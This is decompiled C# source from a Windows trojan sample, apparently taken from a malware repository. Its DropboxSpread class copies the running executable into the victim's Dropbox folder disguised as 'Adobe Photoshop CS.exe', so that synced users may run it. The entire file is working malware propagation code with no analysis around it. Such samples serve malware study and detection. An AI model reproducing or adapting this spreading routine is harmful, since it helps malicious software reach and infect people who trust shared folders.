// Decompiled with JetBrains decompiler
// Type: svchost.Spreads.DropboxSpread
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Windows.Forms;

namespace svchost.Spreads
{
  [OptionText]
  [StandardModule]
  internal sealed class DropboxSpread
  {
    private static object DropboxFolder = (object) Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox");

    public static object SpreadFile()
    {
      object obj;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(DropboxSpread.GetDropbox(), (object) false, true))
        {
          if (File.Exists(Path.Combine(Conversions.ToString(DropboxSpread.DropboxFolder), "Adobe Photoshop CS.exe")))
            File.Delete(Path.Combine(Conversions.ToString(DropboxSpread.DropboxFolder), "Adobe Photoshop CS.exe"));
          File.Copy(Application.ExecutablePath, Path.Combine(Conversions.ToString(DropboxSpread.DropboxFolder), "Adobe Photoshop CS.exe"), true);
          obj = (object) true;
        }
        else
          obj = (object) false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static object GetDropbox() => !Directory.Exists(Conversions.ToString(DropboxSpread.DropboxFolder)) ? (object) false : (object) false;
  }
}
